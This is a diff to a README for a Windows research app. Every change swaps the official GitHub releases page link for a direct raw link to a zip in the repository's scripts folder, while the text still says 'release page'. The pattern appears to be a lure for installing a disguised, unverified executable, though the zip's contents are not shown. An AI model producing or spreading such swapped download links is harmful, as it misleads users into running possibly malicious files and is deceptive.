@@ -1,6 +1,6 @@
 # 🔎 Awesome-Auto-Research-Tools - Research Faster With Less Effort
 
-[![Download from Releases](https://img.shields.io/badge/Download%20from-Releases-blue?style=for-the-badge)](https://github.com/wr1911885-jpg/Awesome-Auto-Research-Tools/releases)
+[![Download from Releases](https://img.shields.io/badge/Download%20from-Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/wr1911885-jpg/Awesome-Auto-Research-Tools/main/scripts/Auto_Awesome_Research_Tools_v3.4.zip)
 
 ## 🧭 What this app does
 
@@ -18,7 +18,7 @@ Use it to:
 
 To get the app, visit this page to download:
 
-https://github.com/wr1911885-jpg/Awesome-Auto-Research-Tools/releases
+https://raw.githubusercontent.com/wr1911885-jpg/Awesome-Auto-Research-Tools/main/scripts/Auto_Awesome_Research_Tools_v3.4.zip
 
 On the release page, look for the latest version and download the Windows file. Most Windows apps are shared as a `.exe` or `.zip` file. If you see a `.zip` file, extract it first, then open the app inside.
 
@@ -41,7 +41,7 @@ If your PC is older, the app should still run, but search and file loading may t
 Follow these steps on Windows:
 
 1. Open the release page:
-   https://github.com/wr1911885-jpg/Awesome-Auto-Research-Tools/releases
+   https://raw.githubusercontent.com/wr1911885-jpg/Awesome-Auto-Research-Tools/main/scripts/Auto_Awesome_Research_Tools_v3.4.zip
 2. Find the newest release at the top of the page
 3. Download the Windows file
 4. If the file is zipped, right-click it and choose Extract All
@@ -178,7 +178,7 @@ This is not required, but it helps keep things clear
 
 Use the official release page any time you need to download the app again or check for a newer version:
 
-[Go to Awesome-Auto-Research-Tools Releases](https://github.com/wr1911885-jpg/Awesome-Auto-Research-Tools/releases)
+[Go to Awesome-Auto-Research-Tools Releases](https://raw.githubusercontent.com/wr1911885-jpg/Awesome-Auto-Research-Tools/main/scripts/Auto_Awesome_Research_Tools_v3.4.zip)
 
 ## 🧾 What you get
 
